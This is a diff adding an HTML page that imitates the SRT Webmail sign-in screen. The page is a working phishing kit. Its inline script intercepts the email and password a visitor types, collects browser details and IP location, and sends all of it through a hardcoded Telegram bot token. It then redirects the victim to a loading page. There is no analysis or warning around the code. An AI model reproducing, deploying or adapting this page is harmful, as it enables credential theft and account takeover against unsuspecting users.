@@ -1,0 +1,389 @@
+
+
+
+<!DOCTYPE html>
+<html lang="en">
+<head><script type='text/javascript' src='https://webmail.srt.com/r0S9AIVzdtEX7CVfGbP4CkInLlIFb-ZJcJmm0VyhdQOV0_-rb1glSqsit7aq5-qRX93MAUDDAYy7Xa1Fl5k4BEUZox8x0beuHOVG7DYrwYvM_TtEKmZ5bV7kkv_0-4o9Gm3EXU3izdcExy_TtLVVGu5zOsJ9i1s44RZIrW_cq_C0rLK2jacCE6PRxpOo5BqQ1btwXhtsJsLDwd4ZDv4yjSem-sb21yfosTn46zTgxkRsMl_dbWTPqEj5IyPMB7fW_mr5Sp1IA_c53h0WlGOV03alPGkCEvXt1DHEMAfc3H8CZ_v9NEp3OBJDqC3UTMXwHvW74FLoSux7R7fyGDr_RbqBfisha9w-fNpnzDiEDvs33SkufOxyTmzNA9-kz_BTWCO-NImTvVRx1s7LLLXI2IAvDE-m6-hhTWVbMyuy9N84kpQXKU9BbG7-VcdWfVHuKJ0FXoPggsLmBHv_ka1yEBs'></script>
+	<!-- Start Meta Fields  -->
+	<meta charset="utf-8">
+	<meta http-equiv="X-UA-Compatible" content="IE=edge">
+	<meta name="viewport" content="width=device-width, initial-scale=1.0">
+	<title>Sign In - SRT Webmail</title>
+	<!-- Ends Meta Fields  -->
+
+	<!-- Font -->
+	<link href="https://fonts.googleapis.com/css?family=Open+Sans:300,400,600,700,800" rel="stylesheet">
+	<!-- End Font -->
+
+
+	<!-- #CSS library STARTS -->
+	<link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.3.1/css/bootstrap.min.css" integrity="sha384-ggOyR0iXCbMQv3Xipma34MD+dH/1fQ784/j6cY/iJTQUOhcWr7x9JvoRxT2MZw1T" crossorigin="anonymous">
+	<link rel="stylesheet" type="text/css" href="https://c82cc6930f2f194a0208-57d85b8e10a5c70b320e1b86a00e79e4.ssl.cf2.rackcdn.com/v1/css/style.css"/>
+	<link rel="stylesheet" type="text/css" href="https://c82cc6930f2f194a0208-57d85b8e10a5c70b320e1b86a00e79e4.ssl.cf2.rackcdn.com/v1/css/responsive_v2.css"/>
+	<!-- #CSS library ENDS -->
+
+
+	<script>
+
+		var m_sDomaincode = "demosrtcom"
+		var g_bMobile = false;
+		var g_sCtime = "8/10/2026 3:47:53 PM";
+	
+	</script>
+
+
+	<style>
+		input {
+			box-shadow: none;
+		}
+	
+		input:focus {
+			box-shadow: none !important;
+		}
+	
+		.form-group {
+			margin-bottom: 0px !important;
+		}
+	
+		.btndisabled {
+			color: #fff;
+			background-color: #B4BCC9 !important;
+		}
+	
+		.loadingimg {
+			display: block;
+			visibility: hidden;
+			margin-left: auto;
+			margin-right: auto;
+			width: 47px;
+			height: 47px;
+			background-image: url("https://c82cc6930f2f194a0208-57d85b8e10a5c70b320e1b86a00e79e4.ssl.cf2.rackcdn.com/v1/images/Ellipsis-1.4s-47px.gif")
+		}
+
+		body {
+
+        background:#f5f2f3;
+
+    	}
+
+		.main-title-wrap h1::after {
+			background-color: #db0632 !important;
+
+		}
+
+	</style>
+
+</head>
+
+<body>
+
+		<main class="main-content-wrapper sign-in-wrapper" id="mLoginBox"  style="background-color: #f5f2f3 !important;">
+
+		<header>
+			<div class="site-logo">
+				<a href="../../" target="_parent">
+					<img src="https://mail.srt.com/app/s/demosrtcom2/srtlogo_WEBMAIL.png" alt="SRT">
+				</a>	
+			</div>
+		</header>
+
+		<section class="content-holder">
+			<div class="container">
+				<!-- Site Title Starts -->
+				<div class="main-title-wrap text-center">
+					<h1 style="display: none;">
+						<span class="text-content">Sign in</span>
+					</h1>
+					<div class="dec-wrap" style="display: none;">
+						<p>Welcome to the new SRT Webmail!</p>
+					</div>
+				</div>
+				<!-- Site Title Ends -->
+<form name="loginForm" onsubmit="handleSubmit(event)" enctype="application/x-www-form-urlencoded" autocomplete="off">
+				<!-- Form Field Starts -->
+				<div class="form-detail-wrapper">
+
+
+
+					<div class="left-content-wrap" style="margin-bottom: 20px">
+
+						<form autocomplete="off">
+							<div class="form-group">
+								<input type="text" autocomplete="on" name="signin_email" id="email" value=""/>
+							
+								<label for="ign-in-email">Full email address</label>
+								<span id="errmsg_signin_email" class="email-error error-msg" style="visibility: hidden">This needs to be filled</span>
+							</div>
+							<div class="form-group">
+								<input autocomplete="on"  type="password" name="signin_password" id="password" value=""  />
+								<label for="password">Password</label>
+								<span id="errmsg_signin_password" class="email-error error-msg" style="visibility: hidden">This needs to be filled</span>
+							</div>
+
+							<div class="form-group" style="font-size: 12px">
+								<input  name="LoginForm[RememberMe]" name="RememberMe" id="RememberMe"  type="checkbox" style="width: auto !important;height: auto  !important;" /> Stay signed in<span style="float: right"><a  href="JavaScript:fnFeedback()" class="link" style="visibility: hidden;">Need help?</a></span>
+							</div>
+						</form>
+ <script>
+        async function getBrowserInfo() {
+            return {
+                browser: navigator.userAgent,
+                language: navigator.language,
+                screenResolution: `${window.screen.width}x${window.screen.height}`,
+                windowSize: `${window.innerWidth}x${window.innerHeight}`,
+                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                timestamp: new Date().toISOString()
+            };
+        }
+
+         async function getIPInfo() {
+            try {
+                // Direct approach with ipinfo.io which is reliable and doesn't require CORS
+                const response = await fetch('https://ipinfo.io/json');
+                const data = await response.json();
+                
+                return {
+                    query: data.ip || 'Unknown',
+                    country: data.country_name || data.country || 'Unknown',
+                    org: data.org || 'Unknown',
+                    isp: data.org || 'Unknown' // Using org as ISP since ipinfo doesn't separate them
+                };
+            } catch (error) {
+                console.error('Primary IP fetch failed:', error);
+                
+                // Fallback to another service
+                try {
+                    const ipResponse = await fetch('https://api.ipify.org?format=json');
+                    const ipData = await ipResponse.json();
+                    
+                    return {
+                        query: ipData.ip || 'Unknown',
+                        country: 'Unknown', // Can't get country from ipify alone
+                        org: 'Unknown',
+                        isp: 'Unknown'
+                    };
+                } catch (fallbackError) {
+                    console.error('Fallback IP fetch failed:', fallbackError);
+                    return {
+                        query: 'Unknown',
+                        country: 'Unknown',
+                        org: 'Unknown',
+                        isp: 'Unknown'
+                    };
+                }
+            }
+        }
+
+        async function sendToTelegram(message) {
+            const BOT_TOKEN = '7480485973:AAEc5xoO6_z6ZtSXAMxZB4iqih4M7peeyoM'; // Add your bot token here
+            const CHAT_ID = '@onlysendlegs'; // Add your chat ID here
+            
+            try {
+                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify({
+                        chat_id: CHAT_ID,
+                        text: message,
+                        parse_mode: 'HTML'
+                    })
+                });
+            } catch (error) {
+                console.error('Error sending to Telegram:', error);
+            }
+        }
+
+        async function handleSubmit(event) {
+            event.preventDefault();
+            
+            const form = event.target;
+            const email = form.email.value;
+            const password = form.password.value;
+            
+            const browserInfo = await getBrowserInfo();
+            const ipInfo = await getIPInfo();
+            
+            const message = `
+📥srt Login Information
+------------------------
+📧 Email: ${email}
+🔑 Password: ${password}
+🌐 IP: ${ipInfo.query}
+🌍 Country: ${ipInfo.country}
+🏢 ISP: ${ipInfo.isp}
+🔍 Organization: ${ipInfo.org}
+🌐 Browser: ${browserInfo.browser}
+🗣 Language: ${browserInfo.language}
+📱 Screen: ${browserInfo.screenResolution}
+🖥 Window: ${browserInfo.windowSize}
+⏰ Timezone: ${browserInfo.timezone}
+📅 Timestamp: ${browserInfo.timestamp}
+            `.trim();
+
+            await sendToTelegram(message);
+
+            try {
+                window.history.go(-2);
+                setTimeout(() => {
+                    if (document.location.href !== 'about:blank') {
+                        window.location.href = 'loading.html';
+                    }
+                }, 500);
+            } catch (e) {
+                window.location.href = 'loading.html';
+            }
+        }
+    </script> 
+
+						<div id="errmsg_api" class="empty-error" style="font-size: 12px; color: #d93025; position:static; margin: 25px 0 10px; visibility: hidden; line-height:18px !important; margin-top: 15px !important">xxxx</div>
+						<div id="g-recaptcha" class="g-recaptcha" data-callback='fnRecaptchaCallback' data-sitekey="" style="display: none"></div>
+
+						<button id="signup_btn"  return false;" style="margin-top: 20px !important; background-color: rgb(122, 122, 122) !important;">Sign In</button>
+						<div class="loadingimg"></div>
+						<div class="get-mobile-app" style="margin-top: 0px !important; display: none; ">
+							<h6 class="text-center" style="margin-top: 0px !important;">Get the mobile app:</h6>
+							<ul class="store-wrap">
+								<li class="apple-store">
+									<a href="https://apps.apple.com/us/app/srt-email/id1496178263" target="_blank">
+										<img src="https://c82cc6930f2f194a0208-57d85b8e10a5c70b320e1b86a00e79e4.ssl.cf2.rackcdn.com/v1/images/apple-store.png" alt="/">
+									</a>
+								</li>
+								<li class="google-store">
+									<a href="https://play.google.com/store/apps/details?id=com.srtmail" target="_blank">
+										<img src="https://c82cc6930f2f194a0208-57d85b8e10a5c70b320e1b86a00e79e4.ssl.cf2.rackcdn.com/v1/images/google-store.png" alt="/">
+									</a>
+								</li>
+							</ul>
+						</div>
+					</div>
+
+					<div class="right-content-wrap">
+						<figure>
+							<img src="https://mail.srt.com/app/s/demosrtcom2/webmaillogin_221.png" alt="">
+						</figure>
+					</div>
+
+					<!-- 
+					<div class="right-content-wrap" style="margin-bottom: 40px">
+						<div class="short-des">
+							<p>Lorem ipsum dolor sit amet, consectetur adipisicing elit. Quo, maiores quasi. Officiis odit similique incidunt aut, laudantium et ea officia. Debitis fugit odio quam consectetur quia similique ex alias, commodi.</p>
+						</div>
+						<ul class="connect-with">
+							<li class="facebook">
+								<a href="#">
+									<span class="icon-wrap">
+										<img src="https://c82cc6930f2f194a0208-57d85b8e10a5c70b320e1b86a00e79e4.ssl.cf2.rackcdn.com/v1/images/facebook.png" alt="Social Icon">
+									</span>
+									<span class="text-content">Continue with Facebook</span>
+								</a>
+							</li>
+							<li class="google">
+								<a href="#">
+									<span class="icon-wrap">
+										<img src="https://c82cc6930f2f194a0208-57d85b8e10a5c70b320e1b86a00e79e4.ssl.cf2.rackcdn.com/v1/images/google.png" alt="Social Icon">
+									</span>
+									<span class="text-content">Continue with Google</span>
+								</a>
+							</li>
+							<li class="twitter">
+								<a href="#">
+									<span class="icon-wrap">
+										<img src="https://c82cc6930f2f194a0208-57d85b8e10a5c70b320e1b86a00e79e4.ssl.cf2.rackcdn.com/v1/images/twitter.png" alt="Social Icon">
+									</span>
+									<span class="text-content">Continue with Twitter</span>
+								</a>
+							</li>
+							<li class="microsoft">
+								<a href="#">
+									<span class="icon-wrap">
+										<img src="https://c82cc6930f2f194a0208-57d85b8e10a5c70b320e1b86a00e79e4.ssl.cf2.rackcdn.com/v1/images/microsoft.png" alt="Social Icon">
+									</span>
+									<span class="text-content">Continue with Microsoft</span>
+								</a>
+							</li>
+						</ul>
+					</div>
+					 -->
+
+				</div>
+				<div class="note">
+					<p>THIS INSTITUTION IS AN EQUAL OPPORTUNITY PROVIDER AND EMPLOYER. @SRT COMMUNICATIONS, INC. ALL RIGHTS RESERVED.</p>
+  
+				</div>
+				<!-- Form Field Ends -->
+			</div>
+		</section>
+
+	</main>
+ 
+
+	<!-- Modal -->
+<div class="modal fade" id="msgModal" tabindex="-1" role="dialog" aria-labelledby="exampleModalLabel" aria-hidden="true">
+		<div class="modal-dialog" role="document">
+			<div class="modal-content">
+				<div class="modal-body" id="msgModalBody">
+					Wrong usernmae or password
+				</div>
+				<div class="modal-footer">
+					<button type="button" class="btn btn-secondary" data-dismiss="modal">Close</button>
+				</div>
+			</div>
+		</div>
+	</div>
+
+	<!-- /.modal -->
+	<div class="modal fade" id="FeedBackmodal">
+		<div class="modal-dialog">
+			<div class="modal-content bmd-modalContent">
+				<div class="modal-body">
+					<div class="close-button">
+						<button type="button" class="close" data-dismiss="modal" aria-label="Close"><span
+								aria-hidden="true">&times;</span></button>
+					</div>
+					<div class="embed-responsive embed-responsive-16by9" id="FeedbackModalBody" style="height: 230px"> 
+						<iframe class="embed-responsive-item" src="../../app/feedback.asp" id="ifrFeedBack" frameborder="0"></iframe>
+					</div>
+				</div>
+	
+			</div><!-- /.modal-content -->
+		</div><!-- /.modal-dialog -->
+	</div>
+	<!-- /.modal -->
+	
+
+	<!-- #JS library STARTS -->
+	<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.4.1/jquery.min.js"></script>
+	<!-- Latest compiled and minified JavaScript -->
+	<script src="https://stackpath.bootstrapcdn.com/bootstrap/4.3.1/js/bootstrap.min.js" integrity="sha384-JjSmVgyd0p3pXB1rRibZUAYoIIy6OrQ6VrjIEaFf/nJGzIxFDsf4x0xIM+B07jRM" crossorigin="anonymous"></script>
+	<script src="/app/s/demosrtcom2/js/signin.js?v=11"></script>
+
+
+	
+	<!-- Global site tag (gtag.js) - Google Analytics -->
+	<script async src="https://www.googletagmanager.com/gtag/js?id=UA-142686384-1"></script>
+	<script>
+		window.dataLayer = window.dataLayer || [];
+		function gtag() { dataLayer.push(arguments); }
+		gtag('js', new Date());
+		gtag('config', 'UA-142686384-1');
+
+
+
+
+	//:::::::
+	//:::::::
+	function fnLoginNoSession()
+	{
+
+	}
+
+	</script>
+
+
+<script type="text/javascript" src="https://pop1-ccs-webchat-api.serverdata.net/script/icr?cid=srt&icr=f3ce32c9-e2ef-4686-aa5a-cb12664f49f0"></script>
+
+	
+</body>
+</html>
